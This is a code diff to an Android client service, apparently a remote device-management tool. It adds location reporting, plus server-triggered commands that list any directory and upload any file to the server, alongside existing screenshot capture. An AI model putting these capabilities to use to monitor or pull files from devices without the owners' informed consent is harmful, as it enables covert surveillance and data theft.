@@ -1,14 +1,18 @@
 package com.meshconnect.client
 
+import android.Manifest
 import android.app.*
 import android.app.ActivityManager
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.graphics.Bitmap
 import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
+import android.location.Location
+import android.location.LocationManager
 import android.media.Image
 import android.media.ImageReader
 import android.media.projection.MediaProjection
@@ -20,12 +24,17 @@ import android.os.BatteryManager
 import android.provider.Settings
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.RequestBody.Companion.asRequestBody
 import okio.ByteString
+import org.json.JSONArray
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
+import java.io.File
+import java.net.URLEncoder
 import java.util.concurrent.TimeUnit
 
 @Suppress("DEPRECATION")
@@ -72,7 +81,8 @@ class WebSocketService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             startForeground(NOTIF_ID, notif,
                 ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
         } else {
             startForeground(NOTIF_ID, notif)
         }
@@ -178,7 +188,7 @@ class WebSocketService : Service() {
             else -> "other"
         }
 
-        return JSONObject().apply {
+        val json = JSONObject().apply {
             put("type",          "status")
             put("battery",       battery)
             put("charging",      charging)
@@ -188,7 +198,38 @@ class WebSocketService : Service() {
             put("storage_total", storageTotal)
             put("network",       network)
             put("uptime",        SystemClock.elapsedRealtime())
-        }.toString()
+        }
+        getBestLocation()?.let { loc ->
+            json.put("latitude",          loc.latitude)
+            json.put("longitude",         loc.longitude)
+            json.put("location_accuracy", loc.accuracy.toDouble())
+            json.put("location_time",     loc.time)
+        }
+        return json.toString()
+    }
+
+    private fun hasLocationPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(this,
+            Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
+            ContextCompat.checkSelfPermission(this,
+            Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun getBestLocation(): Location? {
+        if (!hasLocationPermission()) return null
+        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        var best: Location? = null
+        for (provider in listOf(LocationManager.GPS_PROVIDER,
+                                 LocationManager.NETWORK_PROVIDER,
+                                 LocationManager.PASSIVE_PROVIDER)) {
+            try {
+                if (!lm.isProviderEnabled(provider)) continue
+                val loc = lm.getLastKnownLocation(provider) ?: continue
+                if (best == null || loc.accuracy < best.accuracy) best = loc
+            } catch (_: SecurityException) { /* permission revoked */ }
+            catch (_: IllegalArgumentException) { /* provider unknown */ }
+        }
+        return best
     }
 
     private fun handleIncoming(webSocket: WebSocket, text: String) {
@@ -211,11 +252,110 @@ class WebSocketService : Service() {
                         if (ok) "vibrated" else "no vibrator")
                 }
                 "screenshot" -> captureScreenshot(webSocket, id)
+                "ls" -> handleLs(webSocket, id, msg.optString("path", ""))
+                "download_file" -> handleDownloadFile(webSocket, id, msg.optString("path", ""))
                 else -> sendResult(webSocket, id, command, false, "unknown command")
             }
         } catch (e: Exception) {
             Log.e(TAG, "handleIncoming error", e)
         }
+    }
+
+    private fun handleLs(webSocket: WebSocket, id: String, requestedPath: String) {
+        Thread {
+            try {
+                val target = if (requestedPath.isBlank())
+                    Environment.getExternalStorageDirectory()
+                else File(requestedPath)
+
+                if (!target.exists()) {
+                    sendResult(webSocket, id, "ls", false, "path not found: ${target.absolutePath}")
+                    return@Thread
+                }
+                if (!target.isDirectory) {
+                    sendResult(webSocket, id, "ls", false, "not a directory")
+                    return@Thread
+                }
+
+                val files = target.listFiles() ?: emptyArray()
+                val entries = JSONArray()
+                files.sortedWith(compareByDescending<File> { it.isDirectory }
+                    .thenBy { it.name.lowercase() })
+                    .forEach { f ->
+                        entries.put(JSONObject().apply {
+                            put("name", f.name)
+                            put("is_dir", f.isDirectory)
+                            put("size", if (f.isDirectory) 0L else f.length())
+                            put("modified", f.lastModified())
+                        })
+                    }
+
+                val payload = JSONObject().apply {
+                    put("type", "command_result")
+                    put("id", id)
+                    put("command", "ls")
+                    put("success", true)
+                    put("path", target.absolutePath)
+                    put("parent", target.parentFile?.absolutePath ?: "")
+                    put("entries", entries)
+                }.toString()
+                webSocket.send(payload)
+            } catch (e: Exception) {
+                Log.e(TAG, "ls failed", e)
+                sendResult(webSocket, id, "ls", false, "error: ${e.message}")
+            }
+        }.start()
+    }
+
+    private fun handleDownloadFile(webSocket: WebSocket, id: String, path: String) {
+        Thread {
+            try {
+                val file = File(path)
+                if (!file.exists()) {
+                    sendResult(webSocket, id, "download_file", false, "file not found")
+                    return@Thread
+                }
+                if (!file.isFile) {
+                    sendResult(webSocket, id, "download_file", false, "not a file")
+                    return@Thread
+                }
+                if (file.length() > 100L * 1024 * 1024) {
+                    sendResult(webSocket, id, "download_file", false, "file too large (>100MB)")
+                    return@Thread
+                }
+
+                val httpBase = SERVER_URL.replaceFirst("ws://", "http://")
+                    .replaceFirst("wss://", "https://")
+                    .removeSuffix("/ws")
+                val url = "$httpBase/api/devices/$androidId/files/$id"
+                val body = file.asRequestBody("application/octet-stream".toMediaType())
+                val req = Request.Builder()
+                    .url(url)
+                    .post(body)
+                    .header("X-Filename", URLEncoder.encode(file.name, "UTF-8"))
+                    .build()
+
+                client?.newCall(req)?.execute()?.use { resp ->
+                    if (resp.isSuccessful) {
+                        val payload = JSONObject().apply {
+                            put("type", "command_result")
+                            put("id", id)
+                            put("command", "download_file")
+                            put("success", true)
+                            put("filename", file.name)
+                            put("size", file.length())
+                        }.toString()
+                        webSocket.send(payload)
+                    } else {
+                        sendResult(webSocket, id, "download_file", false,
+                            "upload failed: HTTP ${resp.code}")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "download_file failed", e)
+                sendResult(webSocket, id, "download_file", false, "error: ${e.message}")
+            }
+        }.start()
     }
 
     private fun sendResult(webSocket: WebSocket, id: String, command: String,
